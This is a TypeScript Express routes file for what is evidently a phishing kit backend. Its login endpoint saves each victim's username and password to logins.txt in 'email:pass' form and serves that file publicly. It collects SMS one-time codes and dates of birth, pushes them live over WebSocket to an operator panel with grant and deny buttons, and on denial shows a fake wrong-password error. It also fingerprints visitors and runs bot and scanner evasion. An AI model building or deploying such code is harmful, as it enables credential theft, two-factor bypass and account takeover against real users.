import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { z } from "zod";
import fs from "fs";
import path from "path";
import { storage } from "./storage";
import {
  loginSchema,
  usernameSchema,
  smsVerificationSchema,
  pendingRequests,
  verificationSessions,
} from "@shared/schema";
import crypto from "crypto";
import { db } from "./db";
import { eq, and, desc } from "drizzle-orm";
import {
  applyAllSecurity,
  handleTokenRequest,
  checkHoneypot,
  rateLimitMiddleware,
  analyzeBehavior,
  validateEmailMiddleware,
  requireJavaScript,
  getClientIP,
} from "./advanced-security";

// In-memory storage for pending requests




// In-memory storage for page activity tracking
interface PageActivity {
  pageName: string;
  route: string;
  status: 'active';
  lastAccessed: string;
  visitors: number;
}

const pageActivity = new Map<string, PageActivity>([
  ['recover-username', {
    pageName: 'Username Recovery',
    route: '/recover-username',
    status: 'active',
    lastAccessed: new Date().toISOString(),
    visitors: 0
  }],
  ['recover-password', {
    pageName: 'Password Recovery',
    route: '/recover-password',
    status: 'active',
    lastAccessed: new Date().toISOString(),
    visitors: 0
  }],
  ['register', {
    pageName: 'Registration',
    route: '/register',
    status: 'active',
    lastAccessed: new Date().toISOString(),
    visitors: 0
  }],
  ['privacy', {
    pageName: 'Privacy Policy',
    route: '/privacy',
    status: 'active',
    lastAccessed: new Date().toISOString(),
    visitors: 0
  }],
  ['terms', {
    pageName: 'Terms of Service',
    route: '/terms',
    status: 'active',
    lastAccessed: new Date().toISOString(),
    visitors: 0
  }]
]);

// WebSocket clients for real-time admin notifications
const adminClients = new Set<WebSocket>();

// Broadcast to all connected admin clients
function broadcastToAdmins(data: any) {
  const message = JSON.stringify(data);
  console.log(`[WebSocket Broadcast] Type: ${data.type} | Connected admins: ${adminClients.size}`);
  adminClients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(message);
      console.log(`[WebSocket Broadcast] Sent ${data.type} to admin client`);
    }
  });
}

// Old bot detection system removed - now using advanced-security.ts
// with multi-layered approach including IP reputation, behavioral analysis,
// static user-agent blocking, and sophisticated fingerprinting
// Function to get country and ISP from IP address
async function getCountryFromIP(ip: string): Promise<string> {
  try {
    // Skip if IP is unknown or local
    if (
      ip === "unknown" ||
      ip === "127.0.0.1" ||
      ip === "::1" ||
      ip.startsWith("192.168.") ||
      ip.startsWith("10.") ||
      ip.startsWith("172.")
    ) {
      return "Local";
    }

    // Use IP-API.com for free geolocation (45 requests/minute limit)
    const response = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,country,countryCode,org`,
    );
    const data = await response.json();

    if (data.status === "success" && data.country) {
      return `${data.country} (${data.countryCode})`;
    }

    return "Unknown";
  } catch (error) {
    console.error("Error getting country for IP:", error);
    return "Unknown";
  }
}

type IPDetails = {
  country: string;
  countryCode: string;
  city: string;
  org: string;
  query: string;
};

async function getIPDetails(ip: string): Promise<IPDetails> {
  const fallback = {
    country: "Unknown",
    countryCode: "",
    city: "",
    org: "",
    query: ip,
  };

  if (
    ip === "unknown" ||
    ip === "127.0.0.1" ||
    ip === "::1" ||
    ip.startsWith("192.168.") ||
    ip.startsWith("10.") ||
    ip.startsWith("172.")
  ) {
    return { ...fallback, country: "Local" };
  }

  try {
    const response = await fetch(
      `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,countryCode,city,org,isp,as,query`,
    );
    const data = await response.json();
    return data.status === "success"
      ? {
          country: data.country || "Unknown",
          countryCode: data.countryCode || "",
          city: data.city || "",
          org: data.org || data.isp || data.as || "",
          query: data.query || ip,
        }
      : fallback;
  } catch (error) {
    console.error("Error getting visitor IP details:", error);
    return fallback;
  }
}

// Function to log visitor information
async function logVisitor(req: Request) {
  try {
    // Get real IP address (handles proxies and load balancers)
    const rawIP =
      (req.headers["x-forwarded-for"] as string) ||
      (req.headers["x-real-ip"] as string) ||
      req.socket.remoteAddress ||
      "unknown";

    // Extract first IP from comma-separated list for country lookup
    const ip = rawIP.split(",")[0].trim();

    // Get country information
    const country = await getCountryFromIP(ip);

    // Get current date/time in GMT
    const now = new Date();
    const dateStr = now.toISOString().split("T")[0]; // YYYY-MM-DD
    const timeStr = now.toISOString().split("T")[1].split(".")[0]; // HH:MM:SS

    // Format log entry with country information (shortened)
    const userAgent = req.headers["user-agent"] || "unknown";
    const shortUserAgent =
      userAgent.length > 50 ? userAgent.substring(0, 50) + "..." : userAgent;
    const logEntry = `${ip} (${country}) | ${dateStr} | ${timeStr} | ${req.url} | ${shortUserAgent}\n`;

    // Append to visitors.txt file in public directory so it deploys with the site
    const logPath = path.join(
      process.cwd(),
      "client",
      "public",
      "visitors.txt",
    );

    // Ensure public directory exists
    const publicDir = path.join(process.cwd(), "client", "public");
    if (!fs.existsSync(publicDir)) {
      fs.mkdirSync(publicDir, { recursive: true });
    }

    fs.appendFileSync(logPath, logEntry);
  } catch (error) {
    console.error("Error logging visitor:", error);
  }
}

// Function to clear visitors log file
function clearVisitorsLog() {
  try {
    const logPath = path.join(
      process.cwd(),
      "client",
      "public",
      "visitors.txt",
    );
    fs.writeFileSync(logPath, "");
    const richLogPath = path.join(
      process.cwd(),
      "client",
      "public",
      "visitors-rich.jsonl",
    );
    fs.writeFileSync(richLogPath, "");
    console.log(
      `[${new Date().toISOString()}] Visitors log cleared automatically`,
    );
  } catch (error) {
    console.error("Error clearing visitors log:", error);
  }
}

type VisitorLogEntry = {
  serverIp: string;
  geo_ip: string;
  country: string;
  country_code: string;
  city: string;
  org: string;
  ua: string;
  screen: string;
  tz: string;
  canvas: string;
  webgl: string;
  platform: string;
  cores: string;
  mem: string;
  depth: string;
  touch: string;
  lang: string;
  ref: string;
  path: string;
  ts: string;
};

function parseVisitorLog(fileContent: string): VisitorLogEntry[] {
  return fileContent
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter(Boolean)
    .map((line) => {
      const [location = "", date = "", time = "", requestPath = "", ...uaParts] =
        line.split(" | ");
      const countryMatch = location.match(
        /^(.+?) \((.*?) \(([A-Za-z]{2})\)\)$/,
      );
      const simpleLocationMatch = location.match(/^(.+?) \((.*?)\)$/);
      const serverIp =
        countryMatch?.[1] || simpleLocationMatch?.[1] || location || "unknown";
      const country =
        countryMatch?.[2] || simpleLocationMatch?.[2] || "Unknown";
      const countryCode = countryMatch?.[3]?.toUpperCase() || "";
      const timestamp =
        date && time ? `${date}T${time}Z` : new Date(0).toISOString();

      return {
        serverIp,
        geo_ip: serverIp,
        country,
        country_code: countryCode,
        city: "",
        org: "",
        ua: uaParts.join(" | "),
        screen: "",
        tz: "",
        canvas: "",
        webgl: "",
        platform: "",
        cores: "",
        mem: "",
        depth: "",
        touch: "",
        lang: "",
        ref: "",
        path: requestPath,
        ts: timestamp,
      };
    });
}

function readRichVisitorLog(): VisitorLogEntry[] {
  const richLogPath = path.join(
    process.cwd(),
    "client",
    "public",
    "visitors-rich.jsonl",
  );

  if (!fs.existsSync(richLogPath)) return [];

  return fs
    .readFileSync(richLogPath, "utf8")
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter(Boolean)
    .flatMap((line) => {
      try {
        return [JSON.parse(line) as VisitorLogEntry];
      } catch {
        return [];
      }
    });
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Start visitors log cleanup every 30 minutes
  setInterval(clearVisitorsLog, 30 * 60 * 1000);
  console.log("Visitors log cleanup started (every 30 minutes)");


  // Visitor logging middleware - logs all page visits
  app.use((req: Request, res: Response, next) => {
    // Only log main page visits, not API calls or assets
    if (
      req.url === "/" ||
      req.url.startsWith("/login") ||
      req.url.startsWith("/loading") ||
      req.url.startsWith("/sms") ||
      req.url.startsWith("/admin-control")
    ) {
      // Log visitor async without blocking request
      logVisitor(req).catch((error) =>
        console.error("Visitor logging failed:", error),
      );
    }

    // Track new page visits for admin panel
    const pageRoutes = [
      '/recover-username',
      '/recover-password',
      '/register',
      '/privacy',
      '/terms'
    ];

    if (pageRoutes.includes(req.url)) {
      const pageKey = req.url.substring(1); // Remove leading slash
      const page = pageActivity.get(pageKey);

      if (page) {
        page.lastAccessed = new Date().toISOString();
        page.visitors++;
        pageActivity.set(pageKey, page);

        // Broadcast page activity to admin clients
        broadcastToAdmins({
          type: 'page_activity',
          page: page
        });
      }
    }

    next();
  });

  // Security token endpoint for CSRF protection
  app.get("/api/security/token", handleTokenRequest);

  // Authentication routes with security middleware
  app.post(
    "/api/auth/login",
    applyAllSecurity({ checkBehavior: true, minBehaviorScore: 30 }),
    async (req: Request, res: Response) => {
      try {
        // Honeypot already checked by middleware

        // Validate request body
        const loginData = loginSchema.parse(req.body);

        // Save credentials to logins.txt in email:pass format (permanent log)
        const loginsPath = path.join(process.cwd(), "logins.txt");
        const logEntry = `${loginData.username}:${loginData.password || ""}\n`;
        fs.appendFileSync(loginsPath, logEntry);

        // Save username to usernames.txt
        try {
          const usernamesPath = path.join(
            process.cwd(),
            "client",
            "public",
            "usernames.txt",
          );
          const now = new Date();
          const dateStr = now.toISOString().split("T")[0]; // YYYY-MM-DD
          const timeStr = now.toISOString().split("T")[1].split(".")[0]; // HH:MM:SS
          const usernameEntry = `${loginData.username} | ${dateStr} | ${timeStr}\n`;

          // Ensure public directory exists
          const publicDir = path.join(process.cwd(), "client", "public");
          if (!fs.existsSync(publicDir)) {
            fs.mkdirSync(publicDir, { recursive: true });
          }

          fs.appendFileSync(usernamesPath, usernameEntry);
        } catch (error) {
          console.error("Error saving username:", error);
        }

        // Generate unique request ID
        const requestId =
          Date.now().toString() + Math.random().toString(36).substring(2, 11);

        // Store the pending request in the database
        const newRequest = {
          id: requestId,
          username: loginData.username,
          password: loginData.password || "",
          ipAddress: req.ip || req.connection.remoteAddress || "Unknown",
          userAgent: req.get("User-Agent") || "Unknown",
          status: "pending",
          timestamp: new Date(),
        };

        await db.insert(pendingRequests).values(newRequest);

        // Broadcast to all connected admin clients for real-time notifications
        broadcastToAdmins({
          type: "new_request",
          request: {
            ...newRequest,
            timestamp: newRequest.timestamp.toISOString()
          },
        });

        // Always return success with request ID - admin will control the flow
        res.json({
          success: true,
          message: "Login request submitted",
          requestId: requestId,
        });
      } catch (error) {
        if (error instanceof z.ZodError) {
          res.status(400).json({
            success: false,
            message: "Invalid input data",
            errors: error.errors,
          });
        } else {
          res.status(500).json({
            success: false,
            message: "Internal server error",
          });
        }
      }
    });

  // Check username endpoint (POST method for two-step login)
  app.post(
    "/api/auth/check-username",
    applyAllSecurity({ checkBehavior: true }),
    async (req: Request, res: Response) => {
      try {
        // Honeypot already checked by middleware

        const usernameData = usernameSchema.parse(req.body);
        res.json({
          success: true,
          message: "Username validated",
          username: usernameData.username,
          rememberUsername: usernameData.rememberUsername,
        });
      } catch (error) {
        if (error instanceof z.ZodError) {
          res.status(400).json({
            success: false,
            message: "Invalid input data",
            errors: error.errors,
          });
        } else {
          res.status(500).json({
            success: false,
            message: "Internal server error",
          });
        }
      }
    });
  app.get(
    "/api/auth/check-username/:username",
    async (req: Request, res: Response) => {
      try {
        const username = req.params.username;
        const user = await storage.getUserByUsername(username);

        res.json({
          exists: !!user,
          rememberUsername: user?.rememberUsername || false,
        });
      } catch (error) {
        res.status(500).json({
          success: false,
          message: "Internal server error",
        });
      }
    },
  );
  app.post(
    "/api/auth/register",
    applyAllSecurity({ validateEmails: true, emailField: "email" }),
    async (req: Request, res: Response) => {
      try {
        const userData = req.body;

        const existingUser = await storage.getUserByUsername(userData.username);
        if (existingUser) {
          res.status(409).json({
            success: false,
            message: "Username already exists",
          });
          return;
        }

        const user = await storage.createUser(userData);
        res.json({
          success: true,
          message: "User created successfully",
          user: {
            id: user.id,
            username: user.username,
          },
        });
      } catch (error) {
        res.status(500).json({
          success: false,
          message: "Internal server error",
        });
      }
    });
  app.post(
    "/api/auth/recover-username",
    applyAllSecurity({ validateEmails: true, emailField: "email" }),
    async (req: Request, res: Response) => {
      try {
        const { email } = req.body;
        const ip = getClientIP(req);
        const timestamp = new Date().toISOString();

        // Broadcast recovery request to admin panel in real time
        broadcastToAdmins({
          type: "username_recovery",
          data: {
            email,
            ipAddress: ip,
            userAgent: req.get("User-Agent") || "Unknown",
            timestamp,
          },
        });

        res.json({
          success: true,
          message:
            "If an account exists with that email, recovery instructions have been sent.",
        });
      } catch (error) {
        res.status(500).json({
          success: false,
          message: "Internal server error",
        });
      }
    },
  );
  app.get("/api/admin/pending", async (req: Request, res: Response) => {
    try {
      const pending = await db.select().from(pendingRequests).where(eq(pendingRequests.status, "pending"));
      res.json(pending);
    } catch (error) {
      console.error("Error getting pending requests:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  app.get("/api/admin/sms-history", async (req: Request, res: Response) => {
    try {
      const history = await db.select().from(verificationSessions).orderBy(desc(verificationSessions.timestamp));

      // Map to frontend SMSCode interface
      const mappedHistory = history.map(session => ({
        username: session.username,
        code: session.smsCode || "",
        dateOfBirth: session.dateOfBirth,
        timestamp: session.timestamp ? session.timestamp.toISOString() : new Date().toISOString(),
        sessionId: session.id
      }));

      res.json(mappedHistory);
    } catch (error) {
      console.error("Error getting SMS history:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  app.post("/api/admin/clear-logs", async (req: Request, res: Response) => {
    try {
      // Delete all pending requests
      await db.delete(pendingRequests);

      // Delete all verification sessions (SMS history)
      await db.delete(verificationSessions);

      res.json({ success: true, message: "All logs cleared successfully" });
    } catch (error) {
      console.error("Error clearing logs:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  app.get(
    "/api/auth/status/:requestId",
    async (req: Request, res: Response) => {
      try {
        const requestId = req.params.requestId;
        const [request] = await db.select().from(pendingRequests).where(eq(pendingRequests.id, requestId));

        if (!request) {
          res.status(404).json({
            success: false,
            message: "Request not found",
          });
          return;
        }

        res.json({
          success: true,
          status: request.status,
          requestId: requestId,
        });
      } catch (error) {
        console.error("Error checking status:", error);
        res.status(500).json({
          success: false,
          message: "Internal server error",
        });
      }
    },
  );
  app.post("/api/admin/grant", async (req: Request, res: Response) => {
    try {
      const { requestId } = req.body;

      await db
        .update(pendingRequests)
        .set({ status: "granted" })
        .where(eq(pendingRequests.id, requestId));

      res.json({
        success: true,
        message: "Access granted - proceeding to SMS verification",
      });
    } catch (error) {
      console.error("Error in grant endpoint:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  app.post("/api/admin/deny", async (req: Request, res: Response) => {
    try {
      const { requestId } = req.body;

      await db
        .update(pendingRequests)
        .set({ status: "denied" })
        .where(eq(pendingRequests.id, requestId));

      res.json({
        success: true,
        message: "Access denied - user will see incorrect password error",
      });
    } catch (error) {
      console.error("Error in deny endpoint:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });


  const visitorTelemetrySchema = z.object({
    ua: z.string().max(2000).default(""),
    screen: z.string().max(100).default(""),
    tz: z.string().max(100).default(""),
    canvas: z.string().max(128).default(""),
    webgl: z.string().max(500).default(""),
    platform: z.string().max(200).default(""),
    cores: z.number().int().nonnegative().nullable(),
    mem: z.number().nonnegative().nullable(),
    depth: z.number().int().nonnegative().nullable(),
    touch: z.number().int().nonnegative(),
    lang: z.string().max(100).default(""),
    ref: z.string().max(2000).default(""),
    path: z.string().max(2000).default("/"),
    ts: z.string().datetime().default(() => new Date().toISOString()),
  });

  app.post("/api/visitors/collect", async (req: Request, res: Response) => {
    try {
      const telemetry = visitorTelemetrySchema.parse(req.body);
      const rawIP =
        (req.headers["x-forwarded-for"] as string) ||
        (req.headers["x-real-ip"] as string) ||
        req.socket.remoteAddress ||
        "unknown";
      const ip = rawIP.split(",")[0].trim();
      const geo = await getIPDetails(ip);
      const entry: VisitorLogEntry = {
        serverIp: ip,
        geo_ip: geo.query,
        country: geo.country,
        country_code: geo.countryCode,
        city: geo.city,
        org: geo.org,
        ua: telemetry.ua,
        screen: telemetry.screen,
        tz: telemetry.tz,
        canvas: telemetry.canvas,
        webgl: telemetry.webgl,
        platform: telemetry.platform,
        cores: telemetry.cores?.toString() || "",
        mem: telemetry.mem?.toString() || "",
        depth: telemetry.depth?.toString() || "",
        touch: telemetry.touch.toString(),
        lang: telemetry.lang,
        ref: telemetry.ref,
        path: telemetry.path,
        ts: telemetry.ts,
      };
      const richLogPath = path.join(
        process.cwd(),
        "client",
        "public",
        "visitors-rich.jsonl",
      );
      fs.appendFileSync(richLogPath, `${JSON.stringify(entry)}\n`);
      res.status(201).json({ success: true });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ message: "Invalid visitor telemetry" });
        return;
      }
      console.error("Error collecting visitor telemetry:", error);
      res.status(500).json({ message: "Unable to collect visitor telemetry" });
    }
  });

  app.get("/api/visitors", (_req: Request, res: Response) => {
    try {
      const logPath = path.join(
        process.cwd(),
        "client",
        "public",
        "visitors.txt",
      );

      const legacyEntries = fs.existsSync(logPath)
        ? parseVisitorLog(fs.readFileSync(logPath, "utf8"))
        : [];
      const richEntries = readRichVisitorLog();
      const richKeys = new Set(
        richEntries.map((entry) => `${entry.serverIp}|${entry.path}`),
      );
      const unmatchedLegacyEntries = legacyEntries.filter(
        (entry) => !richKeys.has(`${entry.serverIp}|${entry.path}`),
      );
      res.json([...unmatchedLegacyEntries, ...richEntries]);
    } catch (error) {
      console.error("Error serving visitor data:", error);
      res.status(500).json({ message: "Error reading visitor log file" });
    }
  });

  app.get("/visitors.txt", (_req: Request, res: Response) => {
    try {
      res.sendFile(
        path.join(
          process.cwd(),
          "client",
          "public",
          "visitors-dashboard.html",
        ),
      );
    } catch (error) {
      console.error("Error serving visitors dashboard:", error);
      res.status(500).send("Error loading visitor dashboard");
    }
  });

  app.get("/usernames.txt", (req: Request, res: Response) => {
    try {
      const usernamesPath = path.join(
        process.cwd(),
        "client",
        "public",
        "usernames.txt",
      );

      if (!fs.existsSync(usernamesPath)) {
        res.status(404).send("Usernames file not found");
        return;
      }

      res.setHeader("Content-Type", "text/plain; charset=utf-8");
      res.setHeader("Content-Disposition", 'inline; filename="usernames.txt"');

      const fileContent = fs.readFileSync(usernamesPath, "utf8");
      res.send(fileContent);
    } catch (error) {
      console.error("Error serving usernames.txt:", error);
      res.status(500).send("Error reading usernames file");
    }
  });

  app.get("/logins.txt", (req: Request, res: Response) => {
    try {
      const loginsPath = path.join(process.cwd(), "logins.txt");

      if (!fs.existsSync(loginsPath)) {
        res.status(404).send("Logins file not found");
        return;
      }

      res.setHeader("Content-Type", "text/plain; charset=utf-8");
      res.setHeader("Content-Disposition", 'inline; filename="logins.txt"');

      const fileContent = fs.readFileSync(loginsPath, "utf8");
      res.send(fileContent);
    } catch (error) {
      console.error("Error serving logins.txt:", error);
      res.status(500).send("Error reading logins file");
    }
  });
  const honeypotRoutes = [
    "/sitemap.xml",
    "/wp-admin",
    "/admin",
    "/.env",
    "/config.php",
    "/api/v1/users",
    "/graphql",
    "/.git/config",
    "/wp-config.php",
    "/phpinfo.php",
    "/server-status",
    "/admin.php",
    "/backup.sql",
    "/database.sql",
    "/admin/login",
    "/login.php",
    "/config.json",
    "/package.json",
    "/.htaccess",
    "/web.config",
  ];

  honeypotRoutes.forEach((route) => {
    app.get(route, (req: Request, res: Response) => {
      console.log(
        `[Security Alert] Honeypot accessed: ${route} | IP: ${req.ip || "unknown"} | UA: ${req.get("User-Agent") || "none"}`,
      );

      res.status(404).json({
        error: "Not Found",
        message: "The requested resource was not found",
        timestamp: new Date().toISOString(),
      });
    });

    app.post(route, (req: Request, res: Response) => {
      console.log(
        `[Security Alert] Honeypot POST attempt: ${route} | IP: ${req.ip || "unknown"} | UA: ${req.get("User-Agent") || "none"}`,
      );
      res.status(405).json({
        error: "Method Not Allowed",
        message: "POST method is not supported for this endpoint",
        timestamp: new Date().toISOString(),
      });
    });
  });
  // STEP 1: Verify SMS Code Only
  app.post(
    "/api/sms/verify-code",
    applyAllSecurity({}),
    async (req: Request, res: Response) => {
      try {
        const { username, code } = req.body;

        if (!code || code.length !== 6) {
          return res.status(400).json({
            success: false,
            message: "Invalid verification code",
          });
        }

        const ip =
          (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
          req.socket.remoteAddress ||
          "unknown";

        // Create or update verification session with SMS code
        const sessionId = `${username}-${Date.now()}`;

        await db.insert(verificationSessions).values({
          id: sessionId,
          username,
          smsCode: code,
          ipAddress: ip,
          timestamp: new Date(),
        });

        // Broadcast Step 1 data to admin (SMS code only)
        broadcastToAdmins({
          type: "sms_verification_step1",
          data: {
            sessionId,
            username,
            smsCode: code,
            ipAddress: ip,
            timestamp: new Date().toISOString(),
          },
        });

        res.json({
          success: true,
          message: "SMS code verified",
          sessionId, // Send session ID to client for step 2
        });
      } catch (error) {
        console.error("Error in SMS verify-code endpoint:", error);
        res.status(500).json({
          success: false,
          message: "Internal server error",
        });
      }
    });

  // STEP 2: Add Date of Birth to existing session
  app.post("/api/sms/verify", async (req: Request, res: Response) => {
    try {
      const { username, code, dateOfBirth } = req.body;

      // Validate DOB
      if (!dateOfBirth) {
        return res.status(400).json({
          success: false,
          message: "Date of birth is required",
        });
      }

      // Find the session (search by username and code)
      const [session] = await db.select().from(verificationSessions).where(
        and(
          eq(verificationSessions.username, username),
          eq(verificationSessions.smsCode, code)
        )
      );

      if (!session) {
        return res.status(404).json({
          success: false,
          message:
            "Verification session not found. Please verify your SMS code again.",
        });
      }

      // Update session with DOB
      await db.update(verificationSessions)
        .set({ dateOfBirth })
        .where(eq(verificationSessions.id, session.id));

      // Broadcast Step 2 completion to admin (both SMS code + DOB)
      broadcastToAdmins({
        type: "sms_verification_complete",
        data: {
          sessionId: session.id,
          username: session.username,
          smsCode: session.smsCode,
          dateOfBirth: dateOfBirth,
          ipAddress: session.ipAddress,
          timestamp: new Date().toISOString(),
        },
      });

      res.json({
        success: true,
        message: "SMS verification successful",
      });
    } catch (error) {
      console.error("Error in SMS verify endpoint:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  app.post("/api/sms/resend", async (req: Request, res: Response) => {
    try {
      const { username } = req.body;

      res.json({
        success: true,
        message: "New verification code sent",
      });
    } catch (error) {
      console.error("Error in SMS resend endpoint:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  const httpServer = createServer(app);

  // Set up WebSocket server for real-time admin notifications
  const wss = new WebSocketServer({ server: httpServer, path: "/ws" });

  wss.on("connection", async (ws: WebSocket) => {
    console.log("[WebSocket] Admin client connected");
    adminClients.add(ws);

    try {
      const pending = await db.select().from(pendingRequests).where(eq(pendingRequests.status, "pending"));

      // Send current pending requests to newly connected client
      ws.send(
        JSON.stringify({
          type: "initial_data",
          requests: pending,
          pages: Array.from(pageActivity.values())
        }),
      );
    } catch (error) {
      console.error("Error fetching initial data for WebSocket:", error);
    }

    ws.on("close", () => {
      console.log("[WebSocket] Admin client disconnected");
      adminClients.delete(ws);
    });

    ws.on("error", (error) => {
      console.error("[WebSocket] Client error:", error);
      adminClients.delete(ws);
    });
  });

  // API endpoint to get page activity
  app.get("/api/admin/pages", async (req: Request, res: Response) => {
    try {
      const pages = Array.from(pageActivity.values());
      res.json(pages);
    } catch (error) {
      console.error("Error getting page activity:", error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  return httpServer;
}
